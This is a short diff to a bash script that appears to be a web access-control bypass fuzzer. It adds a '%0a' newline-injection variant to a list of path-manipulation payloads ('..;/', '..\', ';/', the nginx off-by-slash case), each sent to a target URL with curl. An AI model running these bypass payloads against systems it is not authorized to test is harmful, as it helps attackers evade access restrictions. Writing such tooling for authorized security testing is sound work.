@@ -149,6 +149,7 @@ function payload_Between(){
     output "${1}/..;/${2}"                  $(curl_wapper "${1}/..;/${2}") &
     output "${1}/..\\${2}"                  $(curl_wapper "${1}/..\\${2}") &
     output "${1}/;/${2}"                    $(curl_wapper "${1}/;/${2}") &
+    output "${1}/%0a${2}"                   $(curl_wapper "${1}/%0a${2}") &
 
     output "${1}/${2}../${2}"               $(curl_wapper "${1}/${2}../${2}") & # nginx off by slash
 
